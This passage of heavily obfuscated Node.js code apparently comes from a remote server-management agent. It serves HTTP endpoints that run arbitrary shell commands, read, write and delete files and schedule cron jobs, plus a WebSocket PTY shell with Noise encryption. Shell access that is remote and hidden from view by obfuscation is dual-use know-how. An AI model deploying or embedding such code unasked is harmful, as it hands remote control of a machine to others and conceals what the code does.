        a && b[bh(0x3fc)](a[bh(0x30c)], 0x0) && b[bh(0x323)](this['hs'][bh(0x3fd)](), c[bh(0x391)]['NOISE_ACTION_READ_MESSAGE']) && this['hs'][bh(0x1a5)](a);
        if (b[bh(0x323)](this['hs']['GetAction'](), c[bh(0x391)][bh(0x44a)]))
            return this['_splitAndFinish'](), Buffer[bh(0x3a0)](0x0);
        if (this['hs'][bh(0x3fd)]() === c[bh(0x391)]['NOISE_ACTION_WRITE_MESSAGE']) {
            const d = this['hs']['WriteMessage'](new Uint8Array(0x0));
            return b[bh(0x323)](this['hs'][bh(0x3fd)](), c[bh(0x391)][bh(0x44a)]) && this['_splitAndFinish'](), Buffer['from'](d);
        }
        return Buffer[bh(0x3a0)](0x0);
    }
    ['_splitAndFinish']() {
        const bi = a0T, a = this['hs'][bi(0x336)]();
        this[bi(0x2dc)] = a[0x0], this[bi(0x27f)] = a[0x1], this[bi(0x28c)] = !![];
        try {
            if (this['hs'])
                this['hs'][bi(0x455)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const bj = a0T, b = { 'AqZaS': '握手未完成，无法加密数据' };
        if (!this[bj(0x28c)])
            throw new Error(b[bj(0x2a3)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bj(0x1e7)](this[bj(0x2dc)]['EncryptWithAd'](c, d));
    }
    ['decrypt'](a) {
        const bk = a0T, b = { 'tpXTj': bk(0x393) };
        if (!this['handshakeFinished'])
            throw new Error(b[bk(0x2dd)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bk(0x1e7)](this[bk(0x27f)][bk(0x1ff)](c, d));
    }
    ['free']() {
        const bl = a0T, a = { 'PeWiW': bl(0x1fa) }, b = a[bl(0x310)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this[bl(0x2dc)])
                        this['sendCipher'][bl(0x455)]();
                } catch (d) {
                }
                continue;
            case '1':
                try {
                    if (this['hs'])
                        this['hs'][bl(0x455)]();
                } catch (f) {
                }
                continue;
            case '2':
                this['hs'] = null;
                continue;
            case '3':
                this[bl(0x27f)] = null;
                continue;
            case '4':
                this[bl(0x2dc)] = null;
                continue;
            case '5':
                try {
                    if (this[bl(0x27f)])
                        this[bl(0x27f)][bl(0x455)]();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
function a0b(a, b) {
    a = a - 0x19b;
    const c = a0a();
    let d = c[a];
    if (a0b['KtAfTR'] === undefined) {
        var e = function (i) {
            const j = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let l = '', m = '';
            for (let n = 0x0, o, p, q = 0x0; p = i['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? l += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                p = j['indexOf'](p);
            }
            for (let r = 0x0, s = l['length']; r < s; r++) {
                m += '%' + ('00' + l['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(m);
        };
        a0b['rZvwWt'] = e, a0b['zvEDJK'] = {}, a0b['KtAfTR'] = !![];
    }
    const f = c[0x0], g = a + f, h = a0b['zvEDJK'][g];
    return !h ? (d = a0b['rZvwWt'](d), a0b['zvEDJK'][g] = d) : d = h, d;
}
class a0P {
    constructor() {
        const bm = a0T, a = { 'zTXlc': bm(0x44f) }, b = bm(0x231)['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bm(0x25d)] = a0E[bm(0x2a5)][bm(0x418)][bm(0x3ac)];
                continue;
            case '1':
                this[bm(0x3af)] = [];
                continue;
            case '2':
                this[bm(0x379)] = !![];
                continue;
            case '3':
                this[bm(0x472)] = null;
                continue;
            case '4':
                this[bm(0x1a2)] = new a0O(![], this['AGENT_PRIVATE_KEY'], this[bm(0x25d)]);
                continue;
            case '5':
                this['requestId'] = null;
                continue;
            case '6':
                this[bm(0x243)] = [];
                continue;
            case '7':
                this[bm(0x2fe)] = a0E[bm(0x2a5)][bm(0x260)][bm(0x2fb)];
                continue;
            case '8':
                this[bm(0x1b9)] = null;
                continue;
            case '9':
                this[bm(0x362)] = a[bm(0x356)];
                continue;
            }
            break;
        }
    }
    async ['cleanup']() {
        const bn = a0T, a = {
                'ebJBJ': function (b, c) {
                    return b === c;
                },
                'tXPOZ': 'Cleanly\x20closed'
            };
        this['requestId'] && a0u[bn(0x238)]('[' + this['requestId'] + bn(0x220));
        if (this['ptyProcess']) {
            try {
                this[bn(0x472)]['kill']();
            } catch (b) {
            }
            this['ptyProcess'] = null;
        }
        if (this[bn(0x1a2)])
            this[bn(0x1a2)][bn(0x455)]();
        if (this[bn(0x1b9)])
            try {
                a[bn(0x484)](this['websocket'][bn(0x363)], this[bn(0x1b9)][bn(0x43c)]) && this[bn(0x1b9)][bn(0x346)](0x3e8, a[bn(0x3a4)]);
            } catch (c) {
            } finally {
                this[bn(0x1b9)] = null;
            }
    }
    ['_handleRawMessage'](a) {
        const bo = a0T, b = {
                'ruPea': function (c, d) {
                    return c === d;
                },
                'rsENK': bo(0x44f),
                'tGxLk': function (c, d) {
                    return c > d;
                },
                'dCXAe': function (c, d) {
                    return c(d);
                },
                'BJAqx': function (c, d) {
                    return c === d;
                },
                'KAYWV': bo(0x228)
            };
        if (b[bo(0x3b6)](this['phase'], b['rsENK'])) {
            if (b[bo(0x489)](this[bo(0x3af)][bo(0x30c)], 0x0)) {
                const c = this['msgResolvers'][bo(0x19f)]();
                b[bo(0x19c)](c, a);
            } else
                this[bo(0x243)][bo(0x298)](a);
        } else
            b[bo(0x1b5)](this[bo(0x362)], b['KAYWV']) && this[bo(0x41f)](a);
    }
    async ['_receiveWsBytes']() {
        const bp = a0T, a = {
                'RIlZG': function (b, c) {
                    return b > c;
                }
            };
        if (a[bp(0x389)](this[bp(0x243)][bp(0x30c)], 0x0))
            return this[bp(0x243)][bp(0x19f)]();
        return new Promise(b => {
            const bq = bp;
            this['msgResolvers'][bq(0x298)](b);
        });
    }
    async [a0T(0x2f1)](a) {
        const br = a0T, b = {
                'VnxFy': function (c, d) {
                    return c(d);
                },
                'fKHaN': br(0x2f8),
                'ilLew': function (c, d) {
                    return c > d;
                },
                'ciiXT': br(0x451),
                'MYPyw': br(0x216),
                'mnNTv': '加密握手失败'
            };
        b[br(0x263)](a, b[br(0x2ad)]);
        try {
            await this[br(0x1a2)][br(0x2f7)]();
            const c = await this[br(0x26b)](), d = this[br(0x1a2)][br(0x428)](c);
            d && b[br(0x31b)](d[br(0x30c)], 0x0) && this['websocket'][br(0x3f7)](d);
            const f = await this[br(0x26b)]();
            this[br(0x1a2)]['processHandshake'](f);
            if (!this[br(0x1a2)]['handshakeFinished'])
                throw new Error(b[br(0x3f2)]);
            a(b[br(0x215)]);
        } catch (g) {
            a(br(0x452) + g[br(0x42e)]);
            throw new Error(b[br(0x289)]);
        }
    }
    [a0T(0x1d4)]() {
        const bs = a0T, a = {
                'qGCit': bs(0x234),
                'lVCEf': bs(0x1fc)
            }, b = process.env.SHELL;
        if (b && a0h[bs(0x45e)](b))
            return b;
        const c = [
            bs(0x480),
            a[bs(0x29c)],
            '/bin/ash',
            a[bs(0x355)]
        ];
        for (const d of c) {
            if (a0h['existsSync'](d))
                return d;
        }
        return a['lVCEf'];
    }
    async [a0T(0x262)](a, b, c) {
        const bt = a0T, d = {
                'llvJl': function (g, h) {
                    return g(h);
                },
                'VoQWg': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'CEGzB': bt(0x24f)
            };
        this[bt(0x1b9)] = a, this[bt(0x479)] = b;
        const f = g => a0u['info']('[终端会话\x20' + b + ']\x20' + g);
        this[bt(0x379)] = !c, d[bt(0x265)](f, this[bt(0x379)] ? d['VoQWg'] : d[bt(0x25c)]), a['on'](bt(0x42e), g => this[bt(0x49c)](g));
        try {
            this[bt(0x379)] && await this[bt(0x2f1)](f), await this[bt(0x282)](f);
        } catch (g) {
            d['llvJl'](f, '❌\x20终端会话异常:\x20' + g[bt(0x42e)]), await this[bt(0x48e)]();
        }
    }
    async [a0T(0x282)](a) {
        const bu = a0T, b = {
                'wmEWi': bu(0x369),
                'jvoAB': function (f, g) {
                    return f(g);
                },
                'QVEtN': bu(0x3c3),
                'ByiLO': bu(0x324),
                'tTWjU': bu(0x37d),
                'PtLCk': bu(0x228),
                'QjWPA': function (f, g) {
                    return f > g;
                },
                'MVcqb': 'close'
            }, c = this[bu(0x1d4)]();
        b['jvoAB'](a, bu(0x3fb) + c);
        const d = Object[bu(0x44d)]({}, process.env);
        delete d['PROMPT_COMMAND'], d[bu(0x2db)] = b[bu(0x248)];
        if (!d['LANG'])
            d[bu(0x1ba)] = b['tTWjU'];
        try {
            this['ptyProcess'] = a0t[bu(0x46a)](c, [], {
                'name': b[bu(0x248)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': process.env.HOME || process['cwd'](),
                'env': d
            }), b[bu(0x1f6)](a, bu(0x235) + (this['ptyProcess'][bu(0x476)] || bu(0x3b3)) + ')'), this[bu(0x362)] = b[bu(0x284)];
            while (b[bu(0x2e8)](this[bu(0x243)]['length'], 0x0)) {
                const f = this[bu(0x243)]['shift']();
                this[bu(0x41f)](f);
            }
            this['ptyProcess']['onData'](g => {
                const bv = bu;
                try {
                    let h = Buffer['from'](g, b[bv(0x319)]);
                    this[bv(0x379)] && this[bv(0x1a2)] && this['cipher'][bv(0x28c)] && (h = this[bv(0x1a2)][bv(0x24a)](h)), this['websocket'][bv(0x363)] === 0x1 && this[bv(0x1b9)][bv(0x3f7)](h);
                } catch (i) {
                }
            }), this[bu(0x472)][bu(0x394)](({
                exitCode: g,
                signal: h
            }) => {
                const bw = bu;
                b[bw(0x1f6)](a, bw(0x232) + g + ',\x20Signal:\x20' + h + ')'), this[bw(0x48e)]();
            }), this[bu(0x1b9)]['on'](b['MVcqb'], () => {
                const bx = bu;
                b[bx(0x1f6)](a, b[bx(0x273)]), this[bx(0x48e)]();
            });
        } catch (g) {
            b['jvoAB'](a, bu(0x1b8) + g['message']), await this['cleanup']();
            throw g;
        }
    }
    [a0T(0x41f)](a) {
        const by = a0T, b = {
                'lyJyx': by(0x369),
                'dvIAg': function (c, d) {
                    return c === d;
                },
                'kMkxL': by(0x42b),
                'FwiEK': by(0x478),
                'wOuXI': 'input',
                'MzWFg': by(0x210)
            };
        if (!this[by(0x472)])
            return;
        try {
            const c = Buffer[by(0x1e7)](a);
            let d;
            this[by(0x379)] ? d = this['cipher'][by(0x3cc)](c) : d = c;
            let f = ![], g = d['toString'](b[by(0x2fd)]);
            if (g[by(0x413)]()['startsWith']('{'))
                try {
                    const h = JSON[by(0x1dd)](g);
                    f = !![];
                    if (b[by(0x21d)](h['type'], b[by(0x320)])) {
                        let i = Buffer[by(0x1e7)](JSON['stringify']({ 'type': b[by(0x320)] }));
                        if (this['useNoise'])
                            i = this[by(0x1a2)]['encrypt'](i);
                        this[by(0x1b9)][by(0x3f7)](i);
                        return;
                    }
                    if (h['type'] === b[by(0x293)]) {
                        this[by(0x472)]['resize'](h['cols'] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (b[by(0x21d)](h[by(0x1b6)], b[by(0x47c)]) && h[by(0x3e2)] !== undefined) {
                        let j = h[by(0x414)] === 'base64' ? Buffer[by(0x1e7)](h[by(0x3e2)], b['MzWFg'])[by(0x48d)](b['lyJyx']) : h[by(0x3e2)];
                        this[by(0x472)]['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[by(0x472)][by(0x1b1)](d[by(0x48d)](b[by(0x2fd)]));
        } catch (l) {
            a0u['info'](by(0x23a) + this[by(0x479)] + by(0x2b4) + l['message']);
            if (this[by(0x379)])
                this[by(0x48e)]();
        }
    }
}
async function a0Q(a = {}) {
    const bz = a0T, b = {
            'mcOQn': bz(0x3e3),
            'FcOgH': bz(0x2f6),
            'tJIPj': bz(0x1be),
            'QKduN': bz(0x359),
            'dodvZ': bz(0x3a9),
            'ELfku': 'content-type,\x20user-agent,authorization,\x20x-nonce,\x20x-timestamp,\x20x-auth-token,\x20x-aes-encrypted,\x20x-debug',
            'gorrl': bz(0x2ee),
            'TuJyM': bz(0x3a2),
            'BvxVM': function (c) {
                return c();
            },
            'uFuEW': function (c, d) {
                return c === d;
            },
            'JEzGO': function (c, d) {
                return c === d;
            },
            'DBhOj': bz(0x333),
            'sntXy': 'string',
            'bTJKK': function (c, d) {
                return c === d;
            },
            'hFzrC': bz(0x42f),
            'mpOZK': bz(0x2b8),
            'pcQQd': function (c, d) {
                return c === d;
            },
            'zUbaX': 'base64',
            'NRnhF': bz(0x26d),
            'pxaor': bz(0x2b7),
            'CyIYM': bz(0x286),
            'MVQeK': function (c, d, f) {
                return c(d, f);
            },
            'pQyeG': function (c, d, f) {
                return c(d, f);
            },
            'vvUWE': bz(0x462),
            'CczJv': bz(0x3c1),
            'OovMW': bz(0x1ec),
            'xVWFZ': bz(0x233),
            'JWmRt': bz(0x259),
            'jIJPH': bz(0x41c),
            'fNMFF': 'Config\x20validated',
            'lNMui': bz(0x26c),
            'hkNaV': 'CryptoManager\x20initialized',
            'JANVa': bz(0x38b),
            'IvzBX': 'SystemInfoCollector\x20initialized',
            'QZfdM': bz(0x1eb),
            'BpqRL': function (c, d) {
                return c(d);
            },
            'VtGMC': 'Express\x20app\x20created\x20and\x20expressWs\x20applied',
            'RlkQc': bz(0x3d6),
            'NoWLe': bz(0x23f),
            'zJynT': bz(0x3dd),
            'ZUBFY': bz(0x1a6),
            'Wyfmp': bz(0x1bf),
            'xHLHi': bz(0x1d2),
            'cNfwR': '/api/file/cat',
            'Ezste': bz(0x3df),
            'nkChZ': bz(0x471),
            'mjOMI': bz(0x47f),
            'EsJaj': '/api/task/cron',
            'ETuVb': bz(0x203),
            'XjSqu': bz(0x481),
            'GaLPR': bz(0x2e5),
            'svWeC': bz(0x367),
            'YqGuj': bz(0x1f1),
            'XaIkV': bz(0x29e),
            'uncDQ': bz(0x426),
            'yHmyF': bz(0x268),
            'AHJwK': bz(0x25b),
            'rJcBd': bz(0x3cb),
            'RhsUm': bz(0x3bf)
        };
    try {
        const c = await import(b['JWmRt']);
        a0s = c[bz(0x1d0)], a0u[bz(0x3db)](b[bz(0x1c0)]), a0E[bz(0x388)](a), a0u[bz(0x3db)](bz(0x3d0)), a0E[bz(0x45c)](), a0u[bz(0x3db)](b['fNMFF']), a0u[bz(0x3db)](b[bz(0x3b4)]);
        const d = new a0F(a0E[bz(0x305)], a0E[bz(0x36d)]);
        a0u[bz(0x3db)](b[bz(0x439)]), a0u[bz(0x3db)](b[bz(0x1c4)]);
        const f = new a0H();
        a0u[bz(0x3db)](b[bz(0x32c)]), a0u[bz(0x3db)](b[bz(0x329)]);
        const g = b[bz(0x1f3)](a0f);
        b[bz(0x27e)](a0q, g), a0u[bz(0x3db)](b[bz(0x3fe)]), g[bz(0x2bf)]((i, j, k) => {
            const bA = bz, l = b[bA(0x499)][bA(0x46d)]('|');
            let m = 0x0;
            while (!![]) {
                switch (l[m++]) {
                case '0':
                    j['header'](b['FcOgH'], b['tJIPj']);
                    continue;
                case '1':
                    j[bA(0x436)](b[bA(0x247)], '*');
                    continue;
                case '2':
                    j['header'](b[bA(0x495)], b[bA(0x2c7)]);
                    continue;
                case '3':
                    j[bA(0x436)](b['gorrl'], b[bA(0x34f)]);
                    continue;
                case '4':
                    b[bA(0x1f3)](k);
                    continue;
                case '5':
                    if (b[bA(0x314)](i[bA(0x3b7)], bA(0x254)))
                        return j[bA(0x3de)](0xc8)[bA(0x49a)]();
                    continue;
                }
                break;
            }
        }), g[bz(0x2bf)](a0f[bz(0x312)]({
            'type': () => !![],
            'limit': b[bz(0x281)]
        })), g['use'](a0f[bz(0x1d7)]({ 'extended': !![] })), g[bz(0x2bf)](b['BpqRL'](a0G, d)), a0u[bz(0x3db)](b[bz(0x372)]), g[bz(0x3bd)](b['zJynT'], async (i, j) => {
            const bB = bz;
            try {
                const k = await f[bB(0x290)]();
                b['JEzGO'](i[bB(0x287)], ![]) && (k[bB(0x38d)] = null, k[bB(0x347)] = null), j[bB(0x411)](k);
            } catch (l) {
                j['status'](0x1f4)['json']({
                    'status': b[bB(0x3ca)],
                    'message': l[bB(0x42e)]
                });
            }
        }), g[bz(0x3bd)](bz(0x1b7), async (i, j) => {
            const bC = bz;
            try {
                const k = await f['getRealtimeInfo']();
                j[bC(0x411)](k);
            } catch (l) {
                j['status'](0x1f4)[bC(0x411)]({
                    'status': b[bC(0x3ca)],
                    'message': l[bC(0x42e)]
                });
            }
        }), g[bz(0x3c8)](b[bz(0x25a)], async (i, j) => {
            const bD = bz;
            try {
                let k = null;
                if (typeof i['body'] === b['sntXy'])
                    k = i['body'][bD(0x413)]();
                else
                    i['body'] && b[bD(0x488)](typeof i[bD(0x1ed)], b[bD(0x33f)]) && (k = i['body'][bD(0x38e)] || '');
                if (!k)
                    return j[bD(0x3de)](0x190)[bD(0x411)]({
                        'status': b['DBhOj'],
                        'message': b['mpOZK']
                    });
                const l = await a0I['execute'](k, {
                    'cwd': i[bD(0x1ed)][bD(0x437)],
                    'env': i[bD(0x1ed)][bD(0x3c0)],
                    'timeout': a0E[bD(0x3f4)]
                });
                j[bD(0x411)](l);
            } catch (m) {
                j[bD(0x3de)](0x1f4)[bD(0x411)]({
                    'status': bD(0x333),
                    'message': m['message']
                });
            }
        }), g[bz(0x3c8)](b[bz(0x400)], async (i, j) => {
            const bE = bz;
            try {
                const k = await a0J[bE(0x2ac)](i[bE(0x1ed)][bE(0x44e)], i[bE(0x1ed)][bE(0x22e)]);
                j[bE(0x411)]({
                    'status': 'ok',
                    'count': k[bE(0x30c)],
                    'files': k
                });
            } catch (l) {
                j['status'](0x1f4)[bE(0x411)]({
                    'status': b[bE(0x3ca)],
                    'message': l['message']
                });
            }
        }), g[bz(0x3c8)](b[bz(0x1f2)], async (i, j) => {
            const bF = bz;
            try {
                const k = await a0J[bF(0x1e4)](i[bF(0x1ed)][bF(0x2e0)] || []);
                j[bF(0x411)]({
                    'status': 'ok',
                    'files': k
                });
            } catch (l) {
                j[bF(0x3de)](0x1f4)[bF(0x411)]({
                    'status': b['DBhOj'],
                    'message': l['message']
                });
            }
        }), g[bz(0x2e9)](b[bz(0x1f2)], async (i, j) => {
            const bG = bz;
            try {
                const k = i[bG(0x1ed)][bG(0x33b)] || {}, l = b['pcQQd'](i['body'][bG(0x22e)], !![]), m = await a0J[bG(0x3d2)](k, l);
                j[bG(0x411)](m);
            } catch (n) {
                j['status'](0x1f4)['json']({
                    'status': b['DBhOj'],
                    'message': n[bG(0x42e)]
                });
            }
        }), g[bz(0x3c8)](b[bz(0x241)], async (i, j) => {
            const bH = bz;
            try {
                const k = await a0J[bH(0x345)](i[bH(0x1ed)][bH(0x44e)]);
                j[bH(0x411)](k);
            } catch (l) {
                j[bH(0x3de)](0x1f4)[bH(0x411)]({
                    'status': bH(0x333),
                    'message': l[bH(0x42e)]
                });
            }
        }), g[bz(0x3c8)](bz(0x30d), async (i, j) => {
            const bI = bz;
            try {
                const k = await a0J[bI(0x3c9)](i[bI(0x1ed)][bI(0x44e)], i[bI(0x1ed)]['filename'], i[bI(0x1ed)][bI(0x34d)], i[bI(0x1ed)]['chunk_id'], i['body'][bI(0x33a)]);
                j['json'](k);
            } catch (l) {
                j[bI(0x3de)](0x1f4)['json']({
                    'status': b[bI(0x3ca)],
                    'message': l[bI(0x42e)]
                });
            }
        }), g['post'](b[bz(0x2d9)], async (i, j) => {
            const bJ = bz;
            try {
                const k = await a0J[bJ(0x2b3)](i['body']['path']), l = Buffer['from'](k['content'], b[bJ(0x374)]);
                return j[bJ(0x2bb)](b[bJ(0x1e6)], k[bJ(0x213)][bJ(0x48d)]()), j[bJ(0x2bb)](bJ(0x3bb), k[bJ(0x44e)]), j['set'](b['pxaor'], b[bJ(0x279)]), j[bJ(0x3f7)](l);
            } catch (m) {
                j[bJ(0x3de)](0x1f4)[bJ(0x411)]({
                    'status': b['DBhOj'],
                    'message': m[bJ(0x42e)]
                });
            }
        }), g[bz(0x3ff)]('/api/file', async (i, j) => {
            const bK = bz;
            try {
                let k = i[bK(0x1ed)][bK(0x2e0)];
                if (!k || !Array[bK(0x442)](k)) {
                    k = [];
                    if (i['body']['path'])
                        k[bK(0x298)](i[bK(0x1ed)][bK(0x44e)]);
                    if (i['body'][bK(0x3ab)])
                        k['push'](i[bK(0x1ed)][bK(0x3ab)]);
                }
                const l = await a0J[bK(0x45b)](k);
                j[bK(0x411)]({
                    'status': 'ok',
                    'results': l
                });
            } catch (m) {
                j['status'](0x1f4)[bK(0x411)]({
                    'status': b[bK(0x3ca)],
                    'message': m[bK(0x42e)]
                });
            }
        }), g[bz(0x2e9)](bz(0x30d), async (i, j) => {
            const bL = bz;
            try {
                const k = await a0J[bL(0x38c)](i['body']['move_map'] || i[bL(0x1ed)]);
                j[bL(0x411)]({
                    'status': 'ok',
                    'total': k[bL(0x30c)],
                    'success': k['filter'](l => l[bL(0x3de)] === 'ok')['length'],
                    'results': k
                });
            } catch (l) {
                j['status'](0x1f4)[bL(0x411)]({
                    'status': bL(0x333),
                    'message': l[bL(0x42e)]
                });
            }
        }), g[bz(0x3c8)](b[bz(0x370)], async (i, j) => {
            const bM = bz;
            try {
                const k = await a0J['copyFiles'](i['body']);
                j['json']({
                    'status': 'ok',
                    'total': k[bM(0x30c)],
                    'success': k[bM(0x291)](l => l[bM(0x3de)] === 'ok')['length'],
                    'results': k
                });
            } catch (l) {
                j[bM(0x3de)](0x1f4)['json']({
                    'status': b[bM(0x3ca)],
                    'message': l['message']
                });
            }
        }), g[bz(0x3c8)](bz(0x3c4), async (i, j) => {
            const bN = bz;
            try {
                const k = await a0J['createDirectory'](i[bN(0x1ed)][bN(0x44e)]);
                j[bN(0x411)](k);
            } catch (l) {
                j[bN(0x3de)](0x1f4)[bN(0x411)]({
                    'status': b['DBhOj'],
                    'message': l[bN(0x42e)]
                });
            }
        }), g[bz(0x3bd)](b[bz(0x1d8)], (i, j) => {
            const bO = bz;
            j['json'](a0K[bO(0x432)]());
        }), g[bz(0x3c8)](b[bz(0x1d8)], async (i, j) => {
            const bP = bz;
            try {
                const k = await a0K[bP(0x2d7)](i['body']);
                j[bP(0x411)](k);
            } catch (l) {
                j['status'](0x1f4)[bP(0x411)]({
                    'status': bP(0x333),
                    'message': l['message']
                });
            }
        }), g[bz(0x3bd)](b[bz(0x387)], (i, j) => {
            const bQ = bz;
            j['json'](a0K[bQ(0x349)]());
        }), g[bz(0x3c8)](bz(0x2ef), (i, j) => {
            const bR = bz;
            try {
                const k = a0K[bR(0x34c)](i[bR(0x1ed)]);
                j[bR(0x411)](k);
            } catch (l) {
                j[bR(0x3de)](0x1f4)[bR(0x411)]({
                    'status': b[bR(0x3ca)],
                    'message': l[bR(0x42e)]
                });
            }
        }), g[bz(0x3bd)](b[bz(0x438)], (i, j) => {
            const bS = bz;
            j[bS(0x411)](a0K['getTaskStatus']());
        }), g[bz(0x3bd)](b[bz(0x2ed)], (i, j) => {
            const bT = bz;
            let k = b[bT(0x39c)](parseInt, i[bT(0x459)]['limit'], 0xa) || 0x32;
            k = Math['min'](Math['max'](k, 0x1), 0x64), j[bT(0x411)](a0K[bT(0x2d6)](k));
        }), g[bz(0x3bd)](b[bz(0x1d9)], (i, j) => {
            const bU = bz;
            let k = b['pQyeG'](parseInt, i[bU(0x459)]['limit'], 0xa) || 0x32;
            k = Math['min'](Math['max'](k, 0x1), 0x64), j['json'](a0K['getCronLogs'](k));
        }), g[bz(0x3ff)](b[bz(0x2ed)], (i, j) => {
            const bV = bz;
            j[bV(0x411)](a0K[bV(0x3a6)]());
        }), g[bz(0x3ff)](b[bz(0x1d9)], (i, j) => {
            const bW = bz;
            j[bW(0x411)](a0K[bW(0x443)]());
        }), g[bz(0x3bd)](b[bz(0x1bb)], (i, j) => {
            const bX = bz;
            j[bX(0x411)](a0K[bX(0x3f6)]());
        }), g[bz(0x3c8)](b[bz(0x361)], async (i, j) => {
            const bY = bz;
            try {
                const k = await a0K[bY(0x239)]();
                j[bY(0x411)](k);
            } catch (l) {
                j['status'](0x1f4)[bY(0x411)]({
                    'status': 'error',
                    'message': l[bY(0x42e)]
                });
            }
        }), a0u[bz(0x3db)](bz(0x2c4)), g['ws'](b[bz(0x20e)], async (i, j) => {
            const bZ = bz, k = j['params'][0x0];
            a0u[bZ(0x3db)](bZ(0x338) + j['url']), a0u[bZ(0x3db)](bZ(0x492) + k);
            const l = j[bZ(0x459)]['request_id'], m = j[bZ(0x459)][bZ(0x36a)];
            a0u[bZ(0x3db)]('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + l);
            if (!l) {
                a0u['debug'](b[bZ(0x1bc)]), i['close'](0x3f0, b[bZ(0x318)]);
                return;
            }
            const n = new a0P();
            await n['startSession'](i, l, m);
        }), a0u[bz(0x3db)](b['uncDQ']), a0u[bz(0x3db)](b[bz(0x1b2)]);
        const h = g[bz(0x1af)](a0E[bz(0x3ea)], a0E[bz(0x246)], () => {
            const c0 = bz;
            a0u[c0(0x3db)](c0(0x39f) + a0E['AGENT_VERSION'] + c0(0x385) + a0E['HOST'] + ':' + a0E[c0(0x3ea)]), a0u[c0(0x3db)](b['OovMW']);
        });
        process['on'](b['AHJwK'], () => {
            const c1 = bz;
            a0u[c1(0x3db)](b[c1(0x34b)]), h[c1(0x346)](), process[c1(0x435)](0x0);
        }), a0u[bz(0x3db)](b[bz(0x2ba)]);
    } catch (i) {
        a0u[bz(0x333)](b[bz(0x37a)], i), process[bz(0x435)](0x1);
    }
}
function a0a() {
    const c2 = [
        'CMvHzhLtDgf0zq',
        'AwLUy0q',
        'wc1uAw1LC3rHBxa',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'l2fWAs90yxnRl2XVzY9ZDw1Tyxj5',
        'q29UDgvUDc1uExbL',
        'DxrMltG',
        'Dg9Rzw4',
        'B0XWEMW',
        'sw5PDfrHC2S',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'z2v0q3jVBKXVz3m',
        'AhzAy3u',
        'BMTdAfO',
        'wvjdChO',
        'tM9xtgu',
        'ohWYFdn8oxW1Fdz8mxW0Fdb8n3WXma',
        'ELvIyvG',
        't1zRr3q',
        'mtaW',
        '8j+sPsbBuMvZCg9UC2uGrw5JCNLWDf06ia',
        'Dw5SAw5Ru3LUyW',
        'DxnLtM9PC2u',
        'uMHZvw0',
        'C2XPy2u',
        'qwnJzxnZigrLBMLLzdOGCgf0AcbVDxrZAwrLihjVB3q',
        'qY5vveyToa',
        'qNDWwuu',
        'yKjzCe0',
        'zgLYBMfTzq',
        'CMfUzg9TqNL0zxm',
        'su5gtW',
        'Bg9Hza',
        'l3bYB2mVy3b1Aw5MBW',
        'ihn0yxj0zwqGB24G',
        'quDftLrFvKvsu0LptG',
        'rxnkywO',
        'BwvYz2u',
        'uKLSwKC',
        'uhbnz08',
        'sw5PDgLHBgL6Aw5Nifn5C3rLBuLUzM9dB2XSzwn0B3iUlI4',
        'Bw92zuzPBgvZ',
        'C2vZC2LVBL9RzxK',
        'y21K',
        'CMvSzwfZzq',
        'y2XyuvG',
        'y29UC3rHBNrZ',
        'y29WEuzPBgvtEw5J',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'B25fEgL0',
        'DKfvs3O',
        'y3jLyxrLuhvIBgLJs2v5',
        'A2vYBMvSx3zLCNnPB24',
        'vg5WsKS',
        'C2v0qxv0AfrHzW',
        'CMvZDwX0',
        'D3jPDgvgAwXLu3LUyW',
        'tvzrzuS',
        'u0HbmJu2',
        'BNvTyMvY',
        '8j+AGcblAxnHBweGqwDLBNqGtM9Kzs5QCYb2',
        'ywXSB2m',
        'wKXuDM0',
        'r0vulcbqt1nulcbqvvqSierftevursWGt1busu9ouW',
        'rKLmrv9bvurjvf9mt0C',
        'DfHqt1O',
        'CNngzuq',
        'y2XLyxjpBMv0Aw1Ltg9NCW',
        'Ec1Hz2vUDc12zxjZAw9U',
        'tufyx1vqte9brf9tsvPf',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTsgvHzgvYCW',
        'veLnrvnuqu1qx1DjtKrpvW',
        'Cgf0Adi',
        'ChvIBgLJx2i2na',
        'ANDR',
        'sKPUrKG',
        'BxnNuMvZB2X2zxjZ',
        'CNLXq0W',
        'twLZC2LUzYbHDxrOigHLywrLCNm',
        'zu5Ps1e',
        'Dw5RBM93BG',
        'Be5nDwK',
        'lY5KB2nRzxjLBNy',
        'CNvqzwe',
        'Bwv0Ag9K',
        'mtm2ndiYmgLJyuneta',
        'mJeWotK2mvjxCMnXwa',
        'x3bHCNnLtw9Kzq',
        'Ec1VCMLNAw5HBc1WyxrO',
        'y2H1BMTF',
        'z2v0',
        'tMjHA2O',
        'rMf0ywWGzxjYB3iGAw4GBwfPBIGPoG',
        'zw52',
        'twLZC2LUzYbYzxf1zxn0x2LK',
        'DhHFyNL0zxm',
        '8j+uJcdLRQlMIlFNQ6/KUlVLIQJMLQ3LVia',
        'l2fWAs9MAwXLl25LDW',
        'zNjVBuj5DgvbCNjHEq',
        'zxHWCMvZCY13CW',
        'ls0Tls1cruDjtG',
        'Cg9ZDa',
        'DxbSB2fKrMLSzq',
        'rejOt2O',
        'u0Lhsu5uigHHBMrSzxiGCMvNAxn0zxjLza',
        'zgvJCNLWDa',
        'AxneAxjLy3rVCNK',
        'Ahr0Chm6lY9HCgKUAxbPzNKUB3jN',
